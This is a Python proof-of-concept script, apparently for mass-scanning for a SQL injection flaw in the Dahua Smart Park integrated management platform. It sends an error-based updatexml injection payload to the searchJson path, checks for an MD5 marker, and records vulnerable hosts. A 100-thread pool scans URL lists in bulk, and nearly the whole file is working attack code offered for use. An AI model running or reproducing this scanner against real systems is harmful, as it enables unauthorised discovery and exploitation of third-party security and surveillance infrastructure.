
#导包
import requests,re,json,argparse,sys
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
                                _          _                    _____       _ 
                         | |        | |                  / ____|     | |
  ___  ___  __ _ _ __ ___| |__      | |___  ___  _ __   | (___   __ _| |
 / __|/ _ \/ _` | '__/ __| '_ \ _   | / __|/ _ \| '_ \   \___ \ / _` | |
 \__ \  __/ (_| | | | (__| | | | |__| \__ \ (_) | | | |  ____) | (_| | |
 |___/\___|\__,_|_|  \___|_| |_|\____/|___/\___/|_| |_| |_____/ \__, |_|
                                                                   | |  
                                                                   |_|  

                                   
                                         
                                                         
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台 searchJson Sql注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,MD5(1),0x7e),1)--%22%7D/extend/%7B%7D '
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Content-Type':'application/json;charset=UTF-8',
        'Connection':'close',
            }
    try:
        res = requests.get(url=target + payload,verify=False,headers=headers)
        #print(res.text)
        match = re.findall(r'~c4ca4238a0b923820dcc509a6f75849',res.text)
        #print(match)
        if '~c4ca4238a0b923820dcc509a6f75849' in match[0]:
             with open('result1.txt','a',encoding='utf -8') as f:
                f.write(f'[+]{target}存在漏洞 \n')
                print(f'[+]{target}存在漏洞 \n')
        else:
            f.write(f'[-]{target}不存在漏洞 \n')
        
    except:
        pass
    
    
#函数入口
if __name__ == '__main__':
    main()
